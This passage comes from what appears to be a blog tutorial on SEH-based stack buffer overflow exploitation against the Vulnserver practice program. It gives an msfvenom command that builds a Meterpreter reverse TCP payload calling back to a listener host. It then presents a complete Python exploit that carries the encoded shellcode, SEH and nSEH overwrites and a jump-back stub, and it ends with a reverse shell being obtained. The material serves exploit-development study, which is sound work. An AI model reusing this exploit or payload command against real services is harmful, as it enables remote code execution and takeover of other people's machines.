    print("[-] Could not connect to server!")


```


After running the exploit, we can see our `JMP SHORT` and `jmpback` shellcode. 

The `JMP SHORT` takes us to `0176FF96`. Let's keep pressing `F7` to step into the code, after `JMP ECX` we are redirected to the address `0176FDBD`, following that in dump we can see that we have plenty of space to place our shellcode for a reverse shell.


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Space.png)


Now, let's take the jump, press F7. We have around 501 bytes of free space for our reverse shell, which is more than enough.


![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/Debugger_Space.png)



## Generating Shellcode with Metasploit

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.81.128 LPORT=443 -b "\x00" x86/shikata_ga_nai EXITFUN=thread -f c
```

EXITFUNC parameter is so that you can have a clean exit from the target box and shikata_ga_nai is the encoder.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/msfvenom.png)

# Final PoC

The final is below.

We can add NOP's to safely slide into our shellcode, make sure the math is correct, whatever you add the buffer you must take away from the appropriate location. An off by 1 error can throw you off for hours, trust me, speaking with the experience of looking at the screen for days.

```python
#!/usr/bin/python

import socket

host = "192.168.81.129"
port = 9999

shellcode = ("\xd9\xf6\xbb\x44\x79\xc8\x11\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x56\x83\xc0\x04\x31\x58\x14\x03\x58\x50\x9b\x3d\xed\xb0\xd9"
"\xbe\x0e\x40\xbe\x37\xeb\x71\xfe\x2c\x7f\x21\xce\x27\x2d\xcd"
"\xa5\x6a\xc6\x46\xcb\xa2\xe9\xef\x66\x95\xc4\xf0\xdb\xe5\x47"
"\x72\x26\x3a\xa8\x4b\xe9\x4f\xa9\x8c\x14\xbd\xfb\x45\x52\x10"
"\xec\xe2\x2e\xa9\x87\xb8\xbf\xa9\x74\x08\xc1\x98\x2a\x03\x98"
"\x3a\xcc\xc0\x90\x72\xd6\x05\x9c\xcd\x6d\xfd\x6a\xcc\xa7\xcc"
"\x93\x63\x86\xe1\x61\x7d\xce\xc5\x99\x08\x26\x36\x27\x0b\xfd"
"\x45\xf3\x9e\xe6\xed\x70\x38\xc3\x0c\x54\xdf\x80\x02\x11\xab"
"\xcf\x06\xa4\x78\x64\x32\x2d\x7f\xab\xb3\x75\xa4\x6f\x98\x2e"
"\xc5\x36\x44\x80\xfa\x29\x27\x7d\x5f\x21\xc5\x6a\xd2\x68\x81"
"\x5f\xdf\x92\x51\xc8\x68\xe0\x63\x57\xc3\x6e\xcf\x10\xcd\x69"
"\x46\x36\xee\xa6\xe0\x57\x10\x47\x10\x71\xd7\x13\x40\xe9\xfe"
"\x1b\x0b\xe9\xff\xc9\xa1\xe3\x97\x31\x9d\xa5\xe7\xda\xdf\x45"
"\xe9\xa1\x56\xa3\xb9\x85\x38\x7c\x7a\x76\xf8\x2c\x12\x9c\xf7"
"\x13\x02\x9f\xd2\x3b\xa9\x70\x8a\x14\x46\xe8\x97\xef\xf7\xf5"
"\x02\x8a\x38\x7d\xa6\x6a\xf6\x76\xc3\x78\xef\xe0\x2b\x81\xf0"
"\x84\x2b\xeb\xf4\x0e\x7c\x83\xf6\x77\x4a\x0c\x08\x52\xc9\x4b"
"\xf6\x23\xfb\x20\xc1\xb1\x43\x5f\x2e\x56\x43\x9f\x78\x3c\x43"
"\xf7\xdc\x64\x10\xe2\x22\xb1\x05\xbf\xb6\x3a\x7f\x13\x10\x53"
"\x7d\x4a\x56\xfc\x7e\xb9\xe4\xfb\x80\x3f\xc3\xa3\xe8\xbf\x53"
"\x54\xe8\xd5\x53\x04\x80\x22\x7b\xab\x60\xca\x56\xe4\xe8\x41"
"\x37\x46\x89\x56\x12\x06\x17\x56\x91\x93\xa8\x2d\xda\x24\x49"
"\xd2\xf2\x40\x4a\xd2\xfa\x76\x77\x04\xc3\x0c\xb6\x94\x70\x1e"
"\x8d\xb9\xd1\xb5\xed\xee\x22\x9c")

#625010B4 \xB4\x10\x50\x62
SEH = "\xB4\x10\x50\x62"
#JMP SHORT \xEB\xD0\x90\x90
nSEH = "\xEB\xD0\x90\x90"
#D9EED97424F45980C10A90FECDFECDFFE1
jumpback = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"
#\x90
memn0ps = "\x90"

payload = "A" * (3518 - 100 - len(shellcode) - 50 - len(jumpback) - len(nSEH))
payload += memn0ps * 100
payload += shellcode
payload += memn0ps * 50
payload += jumpback
payload += nSEH
payload += SEH
payload += "C" * (5012 - len(payload))

print("Payload length: " + str(len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)
    print("[+] Sending exploit!")
    s.send("GMON /.../" + payload)
    print("[+] Exploit sent!")
    s.close()
except:
    print("[-] Could not connect to server!")
```


Quickly looking at the shellcode, we can see that it will be executed safely.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/debugger_shellcode.png)



Let's step up a handler and hit the play button.

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/handler.png)



W00TW00T! We have a reverse shell :)

![](/images/2020-01-27-Stack-Based-Buffer-Overflows-SEH-Part-2/W00TW00T.png)


Please note that there are many better blogs out there that explain these things better than I do; all you have to do is search.

This is not only for you but for me as well as it is easy to forget these things while you are not using them every day of your life. This blog will help me understand the concept better as well as improve my explanations.

I did this like 2 years ago while doing OSCE and didn't get time to contribute to the community back then. 

I hope you enjoyed it. Hopefully, I will write more when I have the time. :)

#HackThePlanet



## Coming Next
* Egghunter
* ASLR
* DEP



## References 

* https://www.securitysift.com/
* https://www.fuzzysecurity.com/tutorials.html
* https://www.corelan.be/
* https://h0mbre.github.io/
* http://sh3llc0d3r.com/
* https://www.offensive-security.com/
* https://github.com/stephenbradshaw/vulnserver
* http://www.thegreycorner.com/p/vulnserver.html